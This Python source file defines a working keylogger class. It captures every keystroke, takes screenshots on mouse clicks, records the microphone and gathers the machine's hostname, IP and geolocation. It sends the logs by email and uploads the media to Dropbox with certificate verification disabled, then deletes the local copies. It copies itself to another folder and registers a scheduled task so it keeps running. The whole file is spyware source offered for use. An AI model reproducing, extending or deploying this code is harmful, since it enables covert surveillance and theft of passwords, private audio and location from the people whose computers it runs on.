import dropbox
import geocoder
import mss
import os
import platform
import socket
import sounddevice as sd
import ssl
import time
import wave

from pynput import keyboard, mouse
from requests.adapters import HTTPAdapter
from utils import (
    send_mail_with_attachment,
    get_wav_and_png_files,
    delete_wav_and_png_files,
    # remove_env_file,
    upload_to_dropbox,
    save_program_in_location,
    create_scheduled_task,
)


class SSLAdapter(HTTPAdapter):
    # Avoid SSL certificate verification
    def init_poolmanager(self, *args, **kwargs):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        kwargs["ssl_context"] = context
        return super(SSLAdapter, self).init_poolmanager(*args, **kwargs)


class KeyLogger:
    def __init__(
        self,
        time_interval,
        smtp_server,
        smtp_port,
        email_address,
        email_password,
        email_sender,
        email_receiver,
        cc,
        magic_word,
        dropbox_token,
        src_file,
        dest_folder,
        scheduled_task_name,
    ):
        self.interval = time_interval
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.email_address = email_address
        self.email_password = email_password
        self.email_sender = email_sender
        self.email_receiver = email_receiver
        self.cc = cc
        self.magic_word = magic_word
        self.dropbox_token = dropbox_token
        self.src_file = src_file
        self.dest_folder = dest_folder
        self.scheduled_task_name = scheduled_task_name

        self.log = "KeyLogger Started...\n"
        self.keyboard_listener = None
        self.mouse_listener = None
        self.word = ""

    def appendlog(self, string):
        if string:
            self.log = self.log + string

    def on_move(self, x, y):
        # current_move = f"\nMouse moved to {x} {y}"
        # self.appendlog(current_move)
        pass  # do nothing

    def on_scroll(self, x, y, dx, dy):
        # current_scroll = f"\nMouse scrolled at {x} {y} with scroll distance {dx} {dy}"
        # self.appendlog(current_scroll)
        pass  # do nothing

    def on_click(self, x, y, button, pressed):
        if pressed:
            current_click = f"\nMouse click at {x} {y} with button {button}"
            self.screenshot()
            self.appendlog(current_click)

    def save_data(self, key):
        current_key = ""

        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = f" {str(key)} "

        self.word = self.word + current_key
        self.appendlog(f"\nPressed key: {current_key}")

    def send_mail(self, message):
        send_mail_with_attachment(
            smtp_server=self.smtp_server,
            smtp_port=self.smtp_port,
            email_address=self.email_address,
            email_password=self.email_password,
            email_sender=self.email_sender,
            email_receiver=self.email_receiver,
            cc=self.cc,
            path_to_attachment="",
            attachments=[],
            subject="KeyLogger - by F3000",
            body=message,
        )

    def report(self):
        self.send_mail(f"{self.log}")
        wav_and_png_files = get_wav_and_png_files(self.dest_folder)

        try:
            dbx = dropbox.Dropbox(self.dropbox_token)
            session = dbx._session
            session.mount("https://", SSLAdapter())
        except (dropbox.exceptions.ApiError, FileNotFoundError, Exception) as e:
            print(f"Error: {e}")
            return

        upload_to_dropbox(
            socket.gethostname(), dbx, wav_and_png_files, self.dest_folder
        )

        delete_wav_and_png_files(self.dest_folder)

        print(self.log)

    def cleanup(self):
        self.log = ""

        if (
            hasattr(self, "keyboard_listener")
            and self.keyboard_listener
            and self.keyboard_listener.running
        ):
            self.keyboard_listener.stop()

        if (
            hasattr(self, "mouse_listener")
            and self.mouse_listener
            and self.mouse_listener.running
        ):
            self.mouse_listener.stop()

        self.word = ""

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        processor = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog("System info:")
        self.appendlog(f"\nHostname = {hostname}")
        self.appendlog(f"\nIP = {ip}")
        self.appendlog(f"\nProcessor = {processor}")
        self.appendlog(f"\nSystem OS = {system}")
        self.appendlog(f"\nMachine architecture = {machine}")
        self.appendlog("\n\n\n")

    def get_location(self):
        location = geocoder.ip("me")

        self.appendlog("\nLocation info:")

        if location.ok:
            latitude, longitude = location.latlng
            city = location.city
            state = location.state
            country = location.country

            self.appendlog(f"\nGeo position = {latitude} {longitude}")
            self.appendlog(f"\nCity = {city}")
            self.appendlog(f"\nState = {state}")
            self.appendlog(f"\nCountry = {country}")
        else:
            self.appendlog("\nLocation not determined.")

    def microphone(self):
        fs = 44100
        channels = 1  # mono
        seconds = self.interval
        filename = os.path.join(self.dest_folder, f"sound_{time.time()}.wav")
        obj = wave.open(filename, "w")
        obj.setnchannels(channels)  # mono
        obj.setsampwidth(2)  # Sampling of 16 bit
        obj.setframerate(fs)
        myrecording = sd.rec(
            int(seconds * fs), samplerate=fs, channels=channels, dtype="int16"
        )
        sd.wait()
        obj.writeframesraw(myrecording)
        obj.close()
        self.appendlog("\nmicrophone used.")

    def screenshot(self):
        if os.path.exists(self.dest_folder) and os.path.isdir(self.dest_folder):
            try:
                filename = os.path.join(
                    self.dest_folder, f"screenshot_{time.time()}.png"
                )
                with mss.mss() as sct:
                    sct.shot(output=filename)
                self.appendlog("\nscreenshot used.")
            except Exception as e:
                self.appendlog(f"\nError taking screenshot: {e}")

    def run(self):
        # remove_env_file()
        executable_path = save_program_in_location(self.src_file, self.dest_folder)
        create_scheduled_task(executable_path, self.scheduled_task_name)

        self.system_information()
        self.get_location()

        while True:
            self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
            self.keyboard_listener.start()

            self.mouse_listener = mouse.Listener(
                on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
            )
            self.mouse_listener.start()

            self.screenshot()
            self.microphone()

            time.sleep(self.interval)

            self.report()

            if self.magic_word != "" and self.magic_word in self.word:
                break

            self.cleanup()  # this cleanup is used until the while loop works
        self.cleanup()  # this cleanup is used when the while loop stops
